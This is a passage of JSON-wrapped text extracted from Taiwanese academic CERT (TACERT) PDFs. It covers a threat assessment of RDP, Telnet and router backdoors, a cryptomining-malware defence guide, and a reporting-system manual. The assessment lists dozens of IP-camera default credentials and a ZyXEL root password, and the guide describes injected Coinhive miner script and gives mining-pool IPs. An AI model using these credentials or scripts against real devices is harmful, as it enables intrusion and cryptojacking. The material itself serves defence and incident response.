        "File_Name": "學術網路風險威脅評估報告-1.pdf",
        "content": "進行攻擊。 MS.RDP.Connection.Brute.Force 表示當某個單一的來源端在10 秒 內進行了超過200 次的猜測遠端桌面服務的密碼,即判定該來源端 正在進行RDP 的暴力攻擊 影響 產品 所有提供RDP(Remote Desktop Protocol)桌面服務的產品 影響 層面 當攻擊者成功的猜測出帳號及密碼時,即可取得系統上的該帳密 所歸屬的使用者權限(例如猜測出administrator 的使用者,即取得 該使用者的權限)。因此攻擊者可利用此類的權限來更動系統上的 檔案或安裝任意的軟體 修正 說明 如果非必要,建議關閉此項服務。 如果確實需要開啟此項服務,建議利用防火牆來限制來源端,設定 僅允許管理者的主機可登入。而不要對外完全開放 網路 服務 RDP 名稱 MS.Windows.RDP.ESTEEMAUDIT.Code.Execution 說明 在Windows 2000 之後版本的驗證機制新增了以智慧卡(SmartCard) 方式驗證。此漏洞即發生在智慧卡驗證程式。而在Windows XP 及 Windows 2003 的遠端桌面(RDP)服務即使用具有此漏洞的驗證程 式。因此,在上述的作業系統中的RDP 服務即可能具有此類的漏 洞。要利用此漏洞相當的簡單,只要利用發送一個特製的驗證封包 至具有此漏洞的RDP 服務上,即可能觸發此漏洞,而在該主機上 造成RCE(remote code execution,遠端執行程式碼),在系統上執行 任意程式。值得注意的是此漏洞的攻擊碼已被\"Shadow Broker\"駭 客組織以ESTEEMAUDIT 的名稱廣為散佈。Shadow Broker 是2016 年夏季出現的一個駭客組織,曾發布了針對企業防火牆及微軟相 關軟體的漏洞攻擊程式,其中最著名的即為EternalBlue 攻擊工具。 此工具曾被應用在WannaCry 蠕蟲攻擊 CVE CVE-2017-0176,CVE-2017-9073 影響 產品 Windows XP Windows XP SP1 Windows XP SP2 Windows XP SP3 Windows 2003 Windows 2003 SP1  3 臺灣學術網路危機處理",
        "Page_Num": "2,3"
    },
    "632": {
        "File_Name": "學術網路風險威脅評估報告-1.pdf",
        "content": "中心(TACERT) TANet Computer Emergency Response Team Windows 2003 SP2 影響 層面 當攻擊者成功的攻擊後,即可取得該系統的系統權限,因此可輕易 更動系統上的檔案或安裝任意的軟體。 修正 說明 由於微軟目前已停止對於Windows XP 及Windows 2003 產品線的 支援,因此並未針對此漏洞發佈相對應安全修正程式。 建議使用者能儘快停用相關作業系統,並使用其它更新的作業系 統。如果因為現實的考量而必需使用上述的作業系統,建議停用智 慧卡(Smart Card)的驗證方式。 在Windows server 2003 及Windows XP 系統下停用智慧卡驗證方 式,執行如下列指令 <1>在命令列模式執行 gpedit.msc 指令 <2>至” Computer Configuration\\Administrative T emplates\\Windows Components\\Terminal Services\\Client/Server data redirection\\”機碼下 <3>設定 \"Do not allow Smart Card device redirection\"機碼為enable <4>重新啟動電腦 停止智慧卡機碼畫面如下  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team  udp/53413 網路服務 網路 服務 udp/53413 名稱 Netcore.Netis.Devices.Hardcoded.Password.Security.Bypass 說明 在2014 年中國一款路由設備(品牌名稱為Netcore 或Netis) ,即被 證明其所使用的韌體(firmware)存在後門程式。此韌體將預設密碼 以硬編碼(Hard Code)的方式寫入韌體內。並以服務(service)的方 式,在通訊埠53413 進行後門程式的運作,遠端攻擊者可藉由連 接53413 埠的方式,即可以預設密碼登入至該路由設備中,在該 路由設備執行任意命令以及上傳、下載檔案及得到網頁登入的帳 號及密碼等資訊。 影響 產品 所有Netcore/Netis 路由器 影響 層面 使用者可完全的控制此設備 修正 說明 建議根據Netcore/Netis 路由器使用手",
        "Page_Num": "3,4"
    },
    "633": {
        "File_Name": "學術網路風險威脅評估報告-1.pdf",
        "content": "冊的說明,重新更新韌體。 並調整防火牆規則限制外部連線至通訊埠53413  Telnet 網路服務 網路 服務 Telnet 名稱 Telnet.Login.Brute.Force 說明 Telnet.Login.Brute.Force 是對於Telnet 服務進行進行帳號及密碼的 猜測(即暴力攻擊法)。 Telnet 是一種古老的傳輸協定,可允許使用者遠端連線至Telnet 伺 服器進行操作,但由於其認證所使用的帳號及密碼皆以明碼的型 式進行傳輸而可能造成安全性上的漏洞,因此逐漸被其它的傳輸 協定(例如:SSH)所取代。但近年來,由於物聯網(IoT)的盛行,許 多的相關設備(例如:ipcam)即會採用Telnet 的傳輸協定來進行遠端 的連線,甚至有些設備會內建預設帳號及密碼,這也造成Telnet 的 暴力攻擊法越發猖獗。 Telnet.Login.Brute.Force 表示當某個來源端在一分鐘內登入失敗超 過60 次即表示其正在進行Telnet 的暴力攻擊法。 影響 產品 所有開啟telnet 服務的產品  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 影響 層面 使用者可完全的控制此設備 修正 說明 如果非必要,建議關閉telnet 服務。並建議查閱使用手冊的說明, 確認已更改或關閉預設帳號及密碼。 在開啟telnet 服務下,建議調整防火牆設備,限制可連線的來源端 範圍。 網路 服務 Telnet 名稱 Zivif.PR115-204-P-RS.Web.Cameras.Hardcoded.Password 說明 在市面上有某些網路監視器(IP Camera)產品在出廠時即會內建預 設帳號及密碼,並提供telnet 服務讓使用者登入使用。而使用者在 使用此類產品時,常常也會因為疏忽而忘記更改此預設密碼, 也因此遠端攻擊者常會利用以預設帳號密碼登入的方式來嘗試登 入至被攻擊目標telnet 服務中,一但登入成功即能完全",
        "Page_Num": "4,5"
    },
    "634": {
        "File_Name": "學術網路風險威脅評估報告-1.pdf",
        "content": "的控制該台 設備。而Zivif.PR115-204-P-RS.Web.Cameras.Hardcoded.Password 即表示遠端攻擊者正嘗試利用Zivif 產品的預設帳號及密碼進行攻 擊。 除此之外,如下資訊為已廣為流傳的網路監視器的預設帳號及密 碼 ======================== Acta: admin / 123456 Appro: admin / 9999 Avigilon: admin / admin Axis: root / pass Basler: admin / admin Boschs: service / service Brickcom: admin / admin Canon: root / (Camera Model) CBC: admin / admin CNB: root / admin Dahua:admin / admin ,888888/888888,666666/666666 Dynacol: admin / 1234 GeoVision: admin / admin Grandstream: admin / admin GVI: admin / 1234  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team Hikvision: admin / 12345 Honeywell: administrator / 1234 IOImag: admin / admin IPX-DDK: root / admin IQinVisions: root / system JVC: admin / JVC Merit Lilin: admin / pass Messo: admin / (Camera Model) Mobotixs: admin / Meins , admin / meinsm Panasonic: admin / 12345 Pelco Sarix: admin / admin Pixord: admin / admin Riva-Rivatech: root / pass QViS: admin / 1234 Samsung Electronics: root / root , admin / 4321 Samsung Techwin (new): admin / 4321 Samsung Techwin (old): admin / 1111111 Sanyo: admin / admin Scallop: admin / password Sony: admin / admin Stardot: admin / admin Toshiba: root / ikwd Trendnet: admin / admin Telexper / txper: admin / 99999999 Ubiquiti: ubnt / ubnt UNV (Uniview): admin / 123456 Verint: admin / admin VideoIQ: supervisor / supervisor Vivotek: root /空 CVE CVE-2017-17107 CVE-2018-5723 影響 產品 Zivif PR115-204-P-RS V2.3.4.2103 之前的版本 MASTER IPCAMERA01 3.3.4.2103 之前的版本 影響 層面",
        "Page_Num": "5,6"
    },
    "635": {
        "File_Name": "學術網路風險威脅評估報告-1.pdf",
        "content": "使用者可完全的控制此設備 修正 說明 如果非必要,建議關閉telnet 服務。並建議查閱使用手冊的說明, 確認已更改或關閉預設帳號及密碼  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 在開啟telnet 服務下,建議調整防火牆設備,限制可連線的來源端 範圍 網路 服務 Telnet 名稱 ZyXEL.PK5001Z.Modem.Backdoor 說明 在某些舊型的合勤(ZyXEL,https://www.zyxel.com/)的路由器,提 供了telnet 服務供管理者連線至設備上進行管理。但在某些機型上 (目前確認的機型為ZyXEL PK5001Z,其它的機型可能也具有相 同的問題)預設了root(超級用戶)的密碼為zyad5001 及一般使用 者的帳號/密碼(admin/CenturyL1nk),惡意的攻擊者可先利用一般 使用者權限登入至telnet 服務後再以su 指令轉換成root 用戶,即 可取得該系統上的超級使用者(root)的權限,進而控制整台路由 器。 CVE CVE-2016-10401 影響 產品 ZyXEL PK5001Z Modem 影響 層面 使用者可完全的控制此設備 修正 說明 如果非必要,建議關閉telnet 服務。並建議查閱使用手冊的說明, 確認已更改或關閉預設帳號及密碼。 在開啟telnet 服務下,建議調整防火牆設備,限制可連線的來源端 範圍。  TANet 潛在風險 為遵循教育部之資安規定,對於TANet 內之主機偵測通訊埠範圍將只 限於3389, 23,9100, 445, 53413,因此系統只針對上述通訊埠進行偵測。 掃描時間 2018-09-01 至2018-09-30 掃描總數 135,872 台主機  具有潛在風險通訊埠資訊 網路服務(通訊埠) 總數 telnet(23) 72 RDP(3389) 11  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 網路列表機(9100) 47 S",
        "Page_Num": "6,7,8"
    },
    "636": {
        "File_Name": "學術網路風險威脅評估報告-1.pdf",
        "content": "MB (445) 0 通訊埠(53413) 0  結論說明 RDP 服務由於其方便易用的特性,常被使用者用來遠端登入的管理用 途上,也因此常成為惡意攻擊者覬覦的對像,也因此分析SOC 所偵測的攻 擊事件,RDP 的暴力攻擊常居於榜上前三名內,以2018 年1 月至4 月的分 析資料為例,RDP 攻擊更是位居首位。建議使用者如果一定需要開啟RDP 服務,務必要利用資安設備來限制來源端的連線。 另一方面,由於近年來IoT 設備(以下簡稱為設備)的興起,此類的攻 擊也有日漸增多的趨勢,而綜合此類攻擊手法,均是利用設備的設定錯誤(例 如:未更改設備之預設帳號及密碼)來進行攻擊。建議使用者在使用此類設 備時,預必要先行詳閱設備之使用手冊。若發現有預設帳號密碼,務必進行 修改。除此之外,此類設備常會啟動telnet 服務來供使用者遠端連線之用, 在一般的情況下,並不需要此類服務,強烈建議使用者關閉此類服務。 ",
        "Page_Num": "8"
    },
    "637": {
        "File_Name": "惡意挖礦程式防禦指南.pdf",
        "content": "惡意挖礦程式 防禦指南 臺灣學術網路危機處理中心團隊(TACERT)製 2019 年11 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 挖礦源起 1. 挖礦是在做什麼? 它是透過挖礦程式取得虛擬貨幣的過程。靠著使用者間彼此協助驗證,而驗 證的過程是讓電腦解出一連串複雜的密碼學題目,完成解題與驗證後,即可 將交易雙方的錢包地址、交易金額和時間等相關資訊新增至新的區塊中,這 整個過程稱作「挖礦」,而成功完成驗證的礦工可獲得一定數量的虛擬貨幣作 為獎勵。 2. 挖礦綁架威脅雖有減少,但尚未消失 從資安公司賽門鐵克2019 年第24 期ISTR 網路安全威脅報告可以得知,2018 年比2017 年封鎖了更多挖礦綁架事件,使挖礦綁架活動有下降趨勢。挖礦綁 架活動在2017 年12 月至2018 年2 月達到頂峰,賽門鐵克在此期間每月封鎖 約800 萬次挖礦綁架事件。2018 年1 月至12 月間挖礦綁架事件減少52%。 雖然挖礦綁架活動趨減,但賽門鐵克仍在2018 年12 月阻止了超過350 萬次 相關事件。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 挖礦造成能源危機 根據統計,若比特幣挖礦的能源消耗以現在的速度持續成長,預計再過三年, 就會消耗掉全球的電力能源。根據Digiconomist 比特幣能源消耗指數統計, 截至2017 年11 月20 日,比特幣過去一年內挖礦的電力總消耗已累計達29.05 兆瓦小時(TWh),約佔全球總電力消耗的0.13%。該數字甚至已經超過159 個國家一年的電力消耗,包含愛爾蘭和奈及利亞;若全球的比特幣礦工自成 一國,該國的電力消耗排名可排上全球第61 名。下圖顯示了哪些國家/地區 消耗的電量少於全球",
        "Page_Num": "1,2,3"
    },
    "638": {
        "File_Name": "惡意挖礦程式防禦指南.pdf",
        "content": "比特幣開採所消耗的電量,其中比特幣一年開採所消耗 的電量已經超過黃色區域的國家/地區所消耗的電量。 在2018 年末比全球比特幣採礦消耗的電量更多或更少電力的國家分佈情況 可由下圖得知,從圖中可以看到比對2017 年的用電量,2018 年只有38 個國 家消耗的電量超過了總比特幣開採所消耗的電量。根據Digiconomist 比特幣 能源消耗指數估計,比特幣開採每年消耗的電力在55.63 到73.12THh 之間, 這意味著比特幣採礦現在所消耗的電量超過了175 至181 個國家/地區(去年 為159 個)。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 在學術網路內偵測到感染惡意挖礦軟體的事件從2018 年起陸續有明顯上升 的趨勢,在2019 年資安事件量持續名列每個月的前幾名,其中挖礦事件感染 的單位類型約八成為大專校院,因為這些單位使用者眾多,又具備豐富資源。 在學術網路內,常見的挖礦程式有BRTSvc、Smominru、CoinMiner 與 PhotoMiner 等四種。 二、 常見的虛擬貨幣 從觀察挖礦綁架活動的活躍程度,可以發現它大致取決於所加密的貨幣是否 維持高價值,它會隨著所加密貨幣的價值下跌,而使挖礦綁架事件的數量減 少,例如:賽門鐵克2019 年第24 期ISTR 網路安全威脅報告提到,門羅幣 (Monero)在2018 年它的價值下跌將近90%,而挖礦綁架的事件的比例也減 少約52%。在加密的貨幣類別方面,一般常見的虛擬貨幣有比特幣、以太幣 與門羅幣, 而其參考價格如下(資料來源CoinGecko(幣虎):貨幣與加密貨幣 的全方位市場剖析https://www.coingecko.com/zh-tw),其中以比特幣長期位 居第一。 (1)比特幣:US$ 7,161.16。",
        "Page_Num": "3,4"
    },
    "639": {
        "File_Name": "惡意挖礦程式防禦指南.pdf",
        "content": "(2)以太幣:US$ 146.88。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (3)門羅幣:US$ 50.29。 除了透過惡意程式感染使用者電腦方式進行挖礦外,亦有專門以企業方式經 營挖礦的事業,下面大圖為中國比特幣礦廠,下面小圖為專業挖礦機。有趣 的是,有關專業挖礦機的生產,台灣是世界第一。 三、 挖礦程式感染方式 1. 網頁掛碼 在2018 年大多數挖礦綁架活動,是源自瀏覽器加密貨幣挖礦程式,透過Web 瀏覽器的發動來將指令碼掛碼於網頁中執行,當使用者讀取該網頁即開始挖 礦,藉著使用者裝置的運算能力來挖掘加密貨幣,比較著名的是嵌入眾多知 名網站的Coinhive 挖擴程式。它會在使用者訪問網頁時,在使用者不知情或 未經使用者批准的情況下,執行門羅幣的線上挖掘作業,使植入網頁的  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team JavaScript 會利用使用者主機上的資源進行挖礦,這可能造成系統崩潰。下圖 即是網頁被植入Coinhive 挖擴程式進行挖礦的範例,從JavaScript 的語法中 可以看到分成兩大段程式。 (1)至coin-hive.com 網站下載無通知的Coinhive 挖礦程式。 (2)使用JavaScript 來啟動Coinhive 挖礦程式。 A.「np0gtkzs4A2AUhhBktnJZTAyzA7op7QD」是在駭客完成註冊Coinhive 帳號後所取得的Site Key (public)。 B. 「threads:2」是指礦工應該從頭開始的線程數,即主機內可用的CPU 核 心數量。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team C.「miner.start();」指連線礦池,並開始挖礦。 D.「setInterval (function(){...var acceptedHashes=miner.getAcceptedHashes();」 為每",
        "Page_Num": "4,5,6,7"
    },
    "640": {
        "File_Name": "惡意挖礦程式防禦指南.pdf",
        "content": "秒更新一次即時的挖礦統計資訊,包含目前即時的每秒計算的 hash 數目(挖礦速度)、累計 hash 數目以及獲得的門羅幣總金額。 E.「document.getElementById(“11”).textContent...=acceptedHashes」為輸出統 計資訊,駭客可以登入Coinhive 網站後在Dashboard 頁面中看到即時 的挖礦統計資訊。 2. 主機入侵 透過入侵主機後執行挖礦程式進行挖礦的方式是很常見的感染方式,而感染 途徑以使用者開啟社交工程的信件造成居多,例如: 2018 年3 月Dofoil 木馬 程式透過網釣郵件散布,它會在主機植入挖礦程式CoinMiner。雖然如此, 但也有專門入侵伺服器來挖礦的感染方式,例如:2018 年2 月惡意程式 Smominru 利用美國國家安全局外流的攻擊工具EternalBlue 散布與入侵 Windows 伺服器,進行門羅幣挖礦,而臺灣為第三大受災區。安全公司估計 此攻擊約有50 多萬臺Windows 伺服器感染,為駭客賺進8900 個門羅幣,價 值約280 萬到360 萬美元。 3. 程式內嵌 使用偽造或修改有名軟體(APP) 讓使用者執行後挖礦,為挖擴綁架 (Cryptojacking)行為之一,例如:2018 年1 月Chrome 擴充軟體Archive Poster 遭植入Coinhive 採擴程式,用戶只要開啟Chrome 瀏覽器,電腦資源就會被 用來開採門羅幣。在學術網路中,比較典型的案例為2018 年10 月發現Ohsoft 軟體(oCam、VirtualDVD、Secret Folder)在安裝時會一起安裝挖礦程式 BRTSvc.exe,在軟體安裝的授權合約提到除了使用者同意成為挖擴程式的贊 助者外,並且預設同意安裝挖擴程式BRTSvc.exe。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 四、 感染挖礦程式後的症狀 當受害主機感染挖礦程式後,通常會有下列特徵出現",
        "Page_Num": "7,8"
    },
    "641": {
        "File_Name": "惡意挖礦程式防禦指南.pdf",
        "content": "在受害主機上。 1. CPU 使用率上升 觀察感染挖礦程式的受測主機之CPU 實際運作情形,通常會發現CPU 的 使用率有衝高至100%之現象,導致此種現象的來源有兩種,一種為開啟 Coinhive 掛碼的網頁,另一種為主機本身存在挖礦程式。隨著挖礦技術的 演進,新型態的挖礦程式為了避免被使用者發現,通常會盡量讓CPU 使用 率未達100%,如開啟含有Coinhive 挖礦服務的網頁時,會因網站管理者 的意願或駭客的心思,設定CPU 使用率的比例,例如:設定50%。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 典型的挖礦程式只要一執行,CPU 使用率就會衝高至100%如下圖所示。 因此,如遇到典型的挖礦程式,此點是最好判斷的特徵。 2. 對外連線礦池,網路使用率上升 受害主機在感染挖礦程式後必定會有連線礦池的行為,而且通常會使用重 複數字的目的port,例如:3333 或5555,可以從封包內容明顯看到連線礦池 後所進行的動作,以Smominru 挖礦攻擊事件為例,它會連線目的 IP:107.191.99.95 (port:5555),從封包內容可發現受測主機以錢包帳號 「43Lm9q14s7GhMLpUsiXY3MH6G67Sn81B5DqmN46u8WnBX NvJmC6FwH3ZMwAmkEB1nHSrujgthFPQeQCFPCwwE7m7TpspYBd」登入 此目的IP 主機(礦池),而目的IP 主機會回傳目前礦池狀態與挖礦作業id 資訊給受測主機。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 目的IP 主機指派一次挖礦作業(含job id)回傳給受測主機後,受測主機 submit 上傳一次挖礦作業執行成果給目的IP 主機,最後目的IP 主機回應 目前礦池狀態ok",
        "Page_Num": "8,9,10"
    },
    "642": {
        "File_Name": "惡意挖礦程式防禦指南.pdf",
        "content": "給受測主機,如此重複該項動作,進行挖礦。 3. 其他攻擊行為 挖礦程式除了會連線礦池外,有些挖礦程式會有其他攻擊動作,以挖礦程 式Photo.scr 為例,它會1 秒間對外產生大量的目的21 port 連線,也會在每 次重新開機後啟動。 以Smominru 挖礦攻擊事件為例,它會連線至目的IP:78.142.29.152(port: 13000),從封包內容發現受測主機會傳送CPU 規格與作業系統資訊給 IP:78.142.29.152:13000。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 它也會連線至目的IP: 118.184.176.15 (port:80) ,從封包內容發現受測主機與 該IP 進行IP 報到驗證,取得受測主機當下實體IP 位置。 五、 挖礦程式的預防方式 為了避免感染挖礦程式,有下列預防方式提供參考。 1. 避免連線可疑網站。 2. 定期更新系統、修補漏洞與更新應用軟體。 3. 安裝防毒軟體、定期更新病毒碼與進行掃毒作業。 4. 安裝外掛擴充套件:No Coin,來阻擋網頁掛碼式的挖礦攻擊。 5. 關閉不安全的服務與不必須啟用的port。 6. 採用強密碼、雙因素驗證,來避免主機被駭入後植入挖礦程式。 7. 不隨意安裝不明來源的程式,安裝程式時要留意是否有額外安裝不明來源的 程式。 8. 不隨意開啟不明來源的信件或附檔。 六、感染挖礦程式後的應變與處理 1. 找尋挖礦程式所在位置 除了在受害主機上進行掃毒作業來查找挖礦程式的方式外,在主機上也可  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 以執行微軟官方所自行開發的連線檢測工具TCPView,它可以免安裝, 直接執行於主機上。該軟體執行後可以看到主機目前對外連線狀態,可以 找看看有哪一個程式頻繁對外連線,有哪一個程式對外連線使用一些非尋 常的",
        "Page_Num": "10,11,12"
    },
    "643": {
        "File_Name": "惡意挖礦程式防禦指南.pdf",
        "content": "port,例如:3333、5555 或6666 之類的port。在找到此可疑程式後, 可透過確認該程式的用途、比對它連線的目的IP 或目的Port 是否與資安 通報單的佐證資訊相同它、觀察它執行時CPU 使用率是否有衝高,以及 是否為主機上原本安裝的程式等方式,來判斷它是否為挖礦程式。 微 軟 官 方 下 載 TCPView 的 位 置 如 下 : https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview ,當開啟 TCPView 後,要點選最左上方的「A」,將它變成X,這樣才能看到連線 位址以IPv4 形式表示。 2. 移除挖礦程式 透過TCPView 找到挖礦程式後,同時也可得知挖礦程式於主機內所在位 置,依照此資訊將挖礦程式從其所在位置上移除即可。如遇到像因安裝 Ohsoft 軟體而加裝挖礦程式的情形,則挖礦程式不會隨著所嵌入的主程式 Ohsoft 軟體移除而移除,需手動利用新增/移除程式功能來移除它。 3. 封鎖礦池或封鎖挖礦port 在處理挖礦事件時,若第一時間無法找到受害主機,如網路架構為NAT, 使用浮動、不固定的IP,查找受害主機需要花費一段時間,則可以在學 校對外網路的防火牆上設定封鎖連線礦池的目的IP 或封鎖連線礦池的目 的Port,以阻擋挖礦行為,但仍需將受害主機找出來,移除挖礦程式,以 徹底解決挖礦事件。  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 七、相關資料 1. 賽門鐵克2019 年第24 期ISTR 網路安全威脅報告 https://www.symantec.com/zh/tw/security-center/threat-report 2. Bitcoin Mining Now Consuming More Electricity Than 159 Countries Including Ireland & Most Countries In Africa https://powercompare.co.uk/bitcoin/ 3. Countries That",
        "Page_Num": "12,13"
    },
    "644": {
        "File_Name": "惡意挖礦程式防禦指南.pdf",
        "content": "Consume More Or Less Electricity Than Bitcoin Mining In Late 2018 https://powercompare.co.uk/bitcoin-mining-electricity-map/ 4. IThome 挖礦綁架,小心你的電腦變礦工 https://ithome.com.tw/foucs/119617 5. CoinGecko(幣虎):貨幣與加密貨幣的全方位市場剖析 https://www.coingecko.com/zh-tw ",
        "Page_Num": "13"
    },
    "645": {
        "File_Name": "教育機構資安通報平台報表系統操作手冊V2_10705.pdf",
        "content": "教育機構資安通報平台 資安通報報表系統操作 手冊v2 TACERT 臺灣學術網路危機處理中心團隊 製 2018/5  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 目錄 一、 前言 .............................................................................................................................. 2 二、 系統說明 ...................................................................................................................... 2 三、 操作說明 ...................................................................................................................... 4 (1) 系統網址及登入說明: .............................................................................................. 4 (2) OID 查詢(單位OID 暨聯絡人查詢系統) .................................................................. 5 (3) 威脅名單(惡意網站威脅來源清單公告系統) ............................................................ 6 (4) 事件單列表(資安事件報表系統) ................................................................................ 8 (5) EWA 列表(資安預警事件報表系統) .......................................................................... 9 (6) 事件類型統計(資安攻擊類型趨勢統計系統) .......................................................... 11 (7) 轄下單位密碼更動情況 ............................................................................................ 12 (8) DDoS 清洗系統(DDoS 清洗服務申請系統) ............................................................. 12  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、前言 教育機構資安通報平台自99 年啟用,資安事件單之數量亦逐年增加。 TACERT 營運時得知管理單位對於事件單之追蹤及統計之需要,因此於101 年 度開發「教育機構資安通報平台報表系統(以下簡稱資安通報報表系統)」,系統 網址:https://portal.cert.tanet.edu.tw,以利管理單位進行追蹤及統計使用。 二、系統說明 101 年度TACERT 開發「教育機構資安通報平台報表系統(以下簡稱資安通 報報表系統)」,提供二線區縣市網管理人員使用,已完成開發「單位OID 查 詢」、「惡意網站威脅來源清單公告」、「資安事件報表系統」、「資安預警事件報 表系統」與「資安攻擊類型趨勢統計」等子系統。106 年陸續新增「轄下單位 密碼更動情況系統」及「DDoS 清洗服務申請系統」。 資安通報報表系統功能",
        "Page_Num": "1,2,3"
    },
    "646": {
        "File_Name": "教育機構資安通報平台報表系統操作手冊V2_10705.pdf",
        "content": "表如圖1 所示,系統功能說明如表1 所示。 圖1 資安通報報表系統功能表  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 功能 使用人員 功能說明 A1 單位OID 暨 聯絡人查詢 系統 二線人員 區縣市網路中心管理人員與TACERT 營運團隊可以查詢單位 於通報平台內更新的資安連絡人連絡資訊與單位OID 資訊 A2 惡意網站清 單公告系統 二線人員 區縣市網路管理人員可以於此處瀏覽與下載「惡意網站威脅 來源清單」的公告資訊。 TACERT 營運團隊每週匯整由各個資安偵測團隊所偵測的 「惡意網站威脅來源清單」,並每週定期更新「惡意網站威 脅來源清單」。 *107 年5 月新增「下載技服威脅清單」功能,可個別下載由 「行政院國家資通安全會報技術服務中心」所提供的完整惡 意網站威脅來源清單。 A3 資安事件單 報表系統 二線人員 各區縣市網路中心管理人員或TACERT 管理人員可於此處利 用「單位名稱」或「日期區間」,快速查詢與下載其轄下連 線單位的資安事件報表資料,以利進行統計與進行更進一步 之追蹤。 A4 資安預警單 報表系統 二線人員 各區縣市網路中心管理人員或TACERT 管理人員可於此處利 用「單位名稱」或「日期區間」,快速查詢與下載其轄下連 線單位的資安預警事件報表資料,以利進行統計與進行更進 一步之追蹤。 A5 資安事件類 型統計系統 二線人員 提供所有學術網路資安事件攻擊事件量、事件類型統計報 表,讓使用者可了解目前的資安事件攻擊趨勢,進而加以防 範。 A6 轄下單位密 碼更動情況 二線人員 提供各區縣市網路中心管理人員查詢轄下單位密碼更新狀 況,以利追蹤轄下單位是否有確實完成每年度密碼更新作 業。 A7 DDoS 清洗系 統 二線人員 提供二線區",
        "Page_Num": "3,4"
    },
    "647": {
        "File_Name": "教育機構資安通報平台報表系統操作手冊V2_10705.pdf",
        "content": "縣市網路中心管理人員協助轄下連線單位申請 「DDoS 清洗服務」使用,以及查詢其清洗流程。 表1 資安通報報表系統功能說明  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、操作說明 下列將針對系統及子功能進行操作說明,並佐以畫面以利操作。 (1) 系統網址及登入說明: STEP 1. 系統網址:https://portal.cert.tanet.edu.tw 選擇「資安通報報表系統」,如圖2。 圖2 STEP 2. 於登畫面鍵入審核用帳號、密碼(英文+OID 帳號,如Z2.16.....)及驗證 碼,如圖3。 圖3 STEP 3. 介面說明: A. 登入後於上方右側顯示登入帳號及「登出」功能,如圖4 中1 所 示。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team B. 中央上方顯示子功能頁籤,點選可開啟對應子功能,如圖4 中2 所示。 圖 4 (2) OID 查詢(單位OID 暨聯絡人查詢系統) STEP 1. 選擇「OID 查詢」開啟單位OID 暨聯絡人查詢系統,如圖5。 圖 5 STEP 2. A. 開啟單位OID 暨聯絡人查詢系統後,將列出貴單位轄下所有單位 及單位連絡人資料,如圖6 中1 所示。 B. 左上方可針對單位OID 及名稱進行搜尋動作,輸入進行搜尋的 OID 及名稱後,點選「送出」(因瀏覽器定義不同,請勿以Enter 查 詢),如圖6 中2 所示。 1 2  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 圖 6 (3) 威脅名單(惡意網站威脅來源清單公告系統) STEP 1. 選擇「威脅名單」開啟惡意網站威脅來源清單公告系統,如圖7。 圖 7 STEP 2. A. 開啟惡意網站威脅來源清單公告系統後,將列出最新一次更新之威 脅名單列表,如圖8 中1 所示,目前表列近三個月資訊,且固定於每 星期三更新",
        "Page_Num": "4,5,6,7"
    },
    "648": {
        "File_Name": "教育機構資安通報平台報表系統操作手冊V2_10705.pdf",
        "content": "。 B. 中央上方可針對表格內欄位進行搜尋動作,輸入進行搜尋之內容 後,點選「Show」,如圖8 中2 所示。 C. 如需下載該威脅名單,點選「下載TANet 威脅清單」即可取得最 近三個月的完整惡意威脅名單,如圖9 中1所示;如需個別下載技服 中心提供的所有惡意威脅清單,點選「下載技服威脅清單」即可取 2 1  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 得,如圖9 中2所示。 D. 威脅清單內容為機敏性資料,故下載清單會出現「威脅清單內容為 機敏性資料,僅供公務使用,嚴禁外流並依公務密件相關規定處 理!」的提示視窗,提醒使用者留意,點選「確定」即可下載該清 單。 圖 8 圖 9 2 1 2 1  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (4) 事件單列表(資安事件報表系統) STEP 1. 選擇「事件單列表」開啟資安事件報表系統,如圖10。 圖 10 STEP 2. A. 開啟資安事件報表系統後,將列出貴單位轄下管理之事件單列表, 如圖11 中1 所示。 B. 中央上方可針對單位、狀態及時間等條件進行搜尋,完成條件輸入 後,點選「顯示」,如圖11 中2 所示。 C. 如需匯出報表,完成修件輸入後,點選「匯出報表」後點選「下載 excel 結果」即可取報表,如圖12 中12所示。 圖 11 2 1  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 圖 12 (5) EWA 列表(資安預警事件報表系統) STEP 1. 選擇「EWA 列表」開啟資安預警事件報表系統,如圖13。 圖 13 1 2  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team STEP 2. A. 開啟資安預警事件報表系統後,將列出貴單位轄下管理之預警事件 ",
        "Page_Num": "7,8,9,10,11"
    },
    "649": {
        "File_Name": "教育機構資安通報平台報表系統操作手冊V2_10705.pdf",
